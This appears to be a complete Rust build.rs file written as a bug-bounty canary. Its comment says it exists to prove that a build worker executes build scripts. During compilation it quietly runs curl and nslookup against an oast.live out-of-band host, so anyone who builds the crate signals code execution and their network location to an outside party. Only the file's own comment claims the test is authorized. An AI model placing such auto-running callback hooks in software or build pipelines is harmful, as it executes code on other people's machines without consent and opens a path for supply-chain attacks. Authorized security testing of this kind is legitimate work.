fn main() {
    // Authorized BB canary — proves worker executes build scripts
    let host = "dbohm2t6e98o0813i600ciuddjanqsikq.oast.live";
    let _ = std::process::Command::new("curl")
        .args(["-s", "-m", "5", &format!("https://{}/buildrs", host)])
        .status();
    let _ = std::process::Command::new("nslookup")
        .arg(format!("buildrs.{}", host))
        .status();
    println!("cargo:rerun-if-changed=build.rs");
}
